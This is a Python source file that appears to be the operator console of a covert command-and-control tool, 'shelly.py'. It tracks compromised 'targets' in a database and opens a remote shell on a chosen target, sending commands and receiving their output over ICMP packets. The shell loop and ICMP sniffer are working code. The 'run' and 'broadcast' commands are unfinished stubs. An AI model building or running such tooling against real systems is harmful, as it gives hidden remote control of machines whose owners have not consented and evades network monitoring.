#!/usr/bin/python3

# self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
from termcolor import colored
import sys
import time
from shellyparser import ArgumentParser
import socket
import readline
from multiprocessing import Process, Manager

manager = Manager()
shell_lock = manager.Value(bool, False)

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.db = TinyDB('./db.json')
        self.mock_stdout = ""


    def list_hosts(self):
        response = "[ Connected Targets ]\n"

        targets = self.db.all()
        targets = sorted(targets, key=lambda d: d['id'])

        response += "  ID  IP\t\tStatus\t   Location\n"
        response += "  --  --------------  ---------  ---------\n"
        for target in targets:
            response += f"  {target['id']}   {target['ip']}    {target['status']}  {target['location']}\n"
        
        return response

    def sniffing(self, target_ip):
        sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")

    def filter_commands(self, cmd):
        cmd = cmd.split(" ")[0]
        if cmd in ("vim", "nano", "vi", "visudo", "watch", "emacs"):
            print(f"Command {cmd} is not valid as it requires an interactive shell")
            return True
        return False

    def interact(self, target):
        Target = Query()
        target = self.db.search(Target.id == target)[0]

        sniffer = Process(target=self.sniffing, args=(target['ip'],))
        sniffer.start()

        while True:
            if not shell_lock.value:
                cmd = input(colored("shell > ", "red"))
                shell_lock.value = True
                if cmd == "exit":
                    sniffer.kill()
                    break
                elif len(cmd) != 0 and not self.filter_commands(cmd):
                    self.send(target['ip'], "instruction", cmd.encode())
                else:
                    shell_lock.value = False
        
    def instruction(self, shellpack):
        if shellpack['option'] == "TRUNCATED":
            print(shellpack['data'].decode(), end="")
        elif shellpack['option'] == "COMPLETE":
            print(shellpack['data'].decode())
            shell_lock.value = False
        elif shellpack['option'] == "ERROR":
            print(f"[ERROR] {shellpack['data'].decode()}")
            shell_lock.value = False
        else:
            print(f"{shellpack['data'].decode()}")
            shell_lock.value = False

def main():
    controller = Controller()
    parser = ArgumentParser(
                    prog='shelly.py')
    parser.add_argument('command', choices=["ls", "interact", "run", "broadcast"], help='The command to execute')
    parser.set_commands_help({
        'ls': '\tList connected targets',
        'interact': 'Interact with a specified target using the ICMP shell',
        'run': '\tRuns an included module against a specified target or all targets',
        'broadcast': 'Broadcasts a message to all users on all targets',
        })
    parser.add_argument('-t', '--target', choices=[str(target['id']) for target in controller.db.all()], help='The target to interact with/run modules on. Specifying \'*\' will select ALL targets.')  
    args = parser.parse_args()

    if args.command in ('interact', 'run') and (args.target is None):
        parser.error(f"The command {args.command} requires you to set a target with --target")

    match args.command:
        case "ls":
            print(controller.list_hosts())
        case "interact":
            controller.interact(int(args.target))
        case "run":
            print("fart")
            #controller.run()
        case "broadcast":
            print("Broadcast")

if __name__ == "__main__":
    main()

            
    
    
